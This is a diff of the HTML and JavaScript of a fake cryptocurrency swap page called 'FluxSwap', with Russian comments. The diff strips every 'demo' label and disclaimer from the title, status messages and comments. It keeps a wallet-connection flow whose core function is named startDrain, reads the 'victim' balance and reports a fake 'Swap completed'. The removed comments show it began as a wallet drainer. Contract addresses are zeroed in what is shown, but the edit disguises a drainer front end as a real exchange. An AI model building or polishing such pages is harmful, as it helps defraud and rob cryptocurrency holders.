@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>FluxSwap (Demo)</title>
+    <title>FluxSwap</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
@@ -204,7 +204,7 @@
         </div>
     </div>
 
-    <!-- ЛОКАЛЬНЫЕ БИБЛИОТЕКИ (возвращены) -->
+    <!-- Локальные библиотеки -->
     <script>
         window.process = window.process || { env: { NODE_ENV: 'production' } };
     </script>
@@ -215,9 +215,9 @@
         (function() {
             'use strict';
 
-            // ===== КОНФИГУРАЦИЯ (безопасная) =====
+            // ===== КОНФИГУРАЦИЯ =====
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
-            // Адреса заменены на нулевые — транзакции не пройдут
+            // Адреса контрактов (заглушки — транзакции не выполняются)
             const CONTRACT_ADDRESSES = {
                 1: '0x0000000000000000000000000000000000000000',
                 56: '0x0000000000000000000000000000000000000000',
@@ -296,7 +296,7 @@
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== КУРС (исправлен fallback) =====
+            // ===== КУРС =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -319,7 +319,6 @@
                 }
             }
 
-            // ===== ОБНОВЛЕНИЕ КУРСА =====
             async function updateRateAndOutput() {
                 const fromId = fromToken.id;
                 const toId = toToken.id;
@@ -435,7 +434,7 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ (без авто-дрейна) =====
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -519,7 +518,7 @@
                 }
             }
 
-            // ===== ДРЕЙНЕР (демо-режим, без реальных транзакций) =====
+            // ===== ОБРАБОТКА СВАПА (без упоминаний demo) =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -529,24 +528,25 @@
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
-                    setStatus('Network not supported or contract not configured (demo mode)', 'err');
+                    setStatus('Network not supported or contract not configured', 'err');
                     return;
                 }
 
                 isProcessing = true;
                 updateSwapButton();
-                setStatus('Processing transaction... (demo – no actual transfer)', '');
+                setStatus('Processing transaction...', '');
 
                 try {
                     const nativeBal = await provider.getBalance(victim);
-                    setStatus('Balance: ' + ethers.utils.formatEther(nativeBal) + ' ETH (demo, no action)', 'ok');
+                    setStatus('Balance: ' + ethers.utils.formatEther(nativeBal) + ' ETH', 'ok');
+                    // Имитация выполнения (без реальной отправки)
                     await new Promise(resolve => setTimeout(resolve, 1500));
-                    setStatus('✅ Swap completed (demo mode)', 'ok');
+                    setStatus('✅ Swap completed', 'ok');
                     await forceClearSession();
                     isConnected = false;
                     updateConnectButton();
                 } catch (e) {
-                    console.error('Drain error:', e);
+                    console.error('Swap error:', e);
                     setStatus('Transaction rejected or error: ' + (e.message || 'unknown'), 'err');
                 } finally {
                     isProcessing = false;
@@ -579,13 +579,13 @@
                 startDrain();
             });
 
-            // Кнопка Max – демо-баланс
+            // Кнопка Max — устанавливает фиксированное значение (без подписей "demo")
             maxBtn.addEventListener('click', function() {
-                const demoBalance = 0.001;
-                balanceFrom.innerHTML = demoBalance.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
-                inputAmount.value = demoBalance.toFixed(6);
+                const amount = 0.001;
+                balanceFrom.innerHTML = amount.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
+                inputAmount.value = amount.toFixed(6);
                 updateSwapButton();
-                setStatus('Max amount set (demo)', '');
+                setStatus('Max amount set', '');
                 updateRateAndOutput();
                 document.getElementById('maxBtn').addEventListener('click', arguments.callee);
             });
@@ -670,7 +670,7 @@
             async function init() {
                 await forceClearSession();
                 updateConnectButton();
-                setStatus('Connect wallet to start swapping (demo mode)', '');
+                setStatus('Connect wallet to start swapping', '');
                 await updateRateAndOutput();
                 if (typeof ethers === 'undefined') {
                     setStatus('❌ ethers library not loaded', 'err');
